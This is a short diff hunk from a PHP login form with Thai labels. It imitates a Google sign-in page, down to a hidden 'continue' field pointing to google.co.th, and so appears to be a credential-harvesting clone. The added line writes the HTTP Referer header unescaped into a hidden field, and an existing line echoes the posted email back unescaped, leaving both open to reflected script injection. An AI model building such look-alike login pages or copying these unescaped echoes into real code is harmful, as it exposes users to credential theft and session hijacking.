@@ -39,6 +39,7 @@ if($_POST && $_POST['action']=="login"){
 		<input name="continue" type="hidden" value="https://www.google.co.th/">
 		<input type="hidden" name="timeStmp" id="timeStmp" value="<?php echo time();?>">
 		<input type="hidden" name="secTok" id="secTok" value="<?php echo $key; ?>">
+		<input type="hidden" name="self" id="self" value="<?php echo $_SERVER['HTTP_REFERER']; ?>">
 		<label class="hidden-label" for="Email">อีเมล</label>
 		<input id="Email" name="Email" type="email" placeholder="อีเมล" spellcheck="false" class=""
         value="<?php if(isset($_POST)){echo $_POST['Email'];} ?>">
